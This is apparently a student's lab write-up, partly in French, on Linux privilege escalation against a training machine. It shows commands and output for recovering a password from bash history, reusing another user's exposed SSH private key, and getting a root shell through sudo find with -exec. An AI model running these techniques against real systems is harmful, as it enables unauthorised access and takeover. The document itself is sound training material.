
## 1.1. Credentials from Bash History

Pour se connecter:
```bash
ssh alice@10.11.1.36
>>
Unable to negotiate with 10.11.1.36 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss

ssh alice@10.11.1.36 -oHostKeyAlgorithms=+ssh-rsa
```


(i) Search for a password that you can find in the history. What is the password?
```bash
cat .bash_history 
>>
id
*ls
...
su msfabmin
msfadmin
su msfadmin
...

pwd
>>
/home/alice

ls -la
>>
total 44
drwxr-xr-x 6 alice alice 4096 2023-09-27 04:41 .
drwxr-xr-x 8 root  root  4096 2022-06-27 09:16 ..
-rw------- 1 alice alice 7397 2023-09-27 07:55 .bash_history
-rw-r--r-- 1 alice alice  220 2022-06-27 09:16 .bash_logout
-rw-r--r-- 1 alice alice 2928 2022-06-27 09:16 .bashrc
drwxr-xr-x 2 alice alice 4096 2023-09-21 03:42 mahsum
drwxr-xr-x 2 root  root  4096 2023-09-27 04:55 mike
-rw-r--r-- 1 alice alice  586 2022-06-27 09:16 .profile
drwxr-xr-x 2 alice alice 4096 2023-09-21 10:06 Seb
drwx------ 2 alice alice 4096 2023-09-21 05:44 .ssh

```

(2) Do a privilege elevation by logging into your account. What is the user?

```bash
su msfadmin
>>
Password: 

whoami
>>
msfadmin

sudo -l
>>
[sudo] password for msfadmin: 
User msfadmin may run the following commands on this host:
    (ALL) ALL
```




## 1.2. SSH keys


Contexte:
Je suis connecté au serveur distant via le compte de Alice.

But:
Pouvoir me connecter au compte de msfadmin en utilisant en exploitant les différentes clés SSH

Mode opératoire:
```bash
locate id_rsa
>>
/home/msfadmin/.ssh/id_rsa
/home/msfadmin/.ssh/id_rsa.pub

cd /home/msfadmin/.ssh/

ls -la
>>
total 20
drwxr-xr-x 2 msfadmin msfadmin 4096 2010-05-17 21:43 .
drwxr-xr-x 7 msfadmin msfadmin 4096 2022-06-17 06:25 ..
-rwxr-xr-x 1 msfadmin msfadmin 1014 2023-09-27 18:00 authorized_keys
-rwxr-xr-x 1 msfadmin msfadmin 1675 2010-05-17 21:43 id_rsa
-rwxr-xr-x 1 msfadmin msfadmin  405 2010-05-17 21:43 id_rsa.pub

# On rajoute la clé public id_rsa.pub à la ligne du fichier authoried_keys (côté serveur)
echo "......." >> authorized_keys

# On crée une clé privé (côté client) qui correspond à la clé privé de msfadmin
nano msfadmin_ssh_key

ls -l
>>
total 4
-rw-r--r-- 1 nabil nabil 1675 Sep 27 23:22 msfadmin_ssh_key

chmod 600 msfadmin_ssh_key 

ls -l
>>
total 4
-rw------- 1 nabil nabil 1675 Sep 27 23:22 msfadmin_ssh_key

# On se connecte avec les bonnes options
ssh -i msfadmin_ssh_key msfadmin@10.11.1.36 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa
```



## 1.3. Sudo Access

1.What programs can we run as sudo?
```bash
sudo -l
User alice may run the following commands on this host:
    (ALL) NOPASSWD: /bin/mkdir
    (ALL) NOPASSWD: /bin/rmdir
    (ALL) NOPASSWD: /usr/bin/find
```

2.Look at the gtfobins site to see which executable would give
you root privileges
```bash
find
```

3.Execute the command
```bash
sudo find /home -exec sh -i \;

whoami
>>
root

su alice
```

4.What is the executable run as sudo ?
```
/usr/bin/find or /bin/sh
```



## 1.4. Group Privilege

-

